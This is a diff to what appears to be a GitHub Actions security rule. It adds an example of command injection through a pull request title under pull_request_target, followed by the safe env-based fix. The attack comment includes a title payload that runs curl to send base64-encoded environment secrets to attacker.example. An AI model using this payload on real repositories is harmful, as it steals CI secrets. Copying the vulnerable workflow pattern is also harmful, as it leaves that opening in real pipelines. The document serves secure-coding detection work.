@@ -48,6 +48,37 @@ RULE = Rule(
         "see. Mitigation is the same: never interpolate context into "
         "shell, route through ``env:``.",
     ),
+    exploit_example=(
+        "# Vulnerable: PR title interpolated straight into shell.\n"
+        "name: triage\n"
+        "on:\n"
+        "  pull_request_target:\n"
+        "    types: [opened, edited]\n"
+        "jobs:\n"
+        "  greet:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          echo \"New PR: ${{ github.event.pull_request.title }}\"\n"
+        "\n"
+        "# Attack: open a PR with the title:\n"
+        "#\n"
+        "#   foo\"; curl -X POST https://attacker.example/exfil \\\n"
+        "#         -d \"$(env | base64 -w0)\"; echo \"\n"
+        "#\n"
+        "# GitHub expands ``${{ ... }}`` BEFORE shell quoting, so the\n"
+        "# title's `\"` closes the echo string and the rest of the line\n"
+        "# becomes shell. The pull_request_target trigger means the\n"
+        "# runner already has secrets and a write-scope GITHUB_TOKEN,\n"
+        "# so the curl exfils every secret the workflow can see.\n"
+        "\n"
+        "# Safe: route through env so the value is never interpolated\n"
+        "# into the shell template:\n"
+        "      - env:\n"
+        "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
+        "        run: |\n"
+        "          echo \"New PR: $PR_TITLE\""
+    ),
 )
 
 
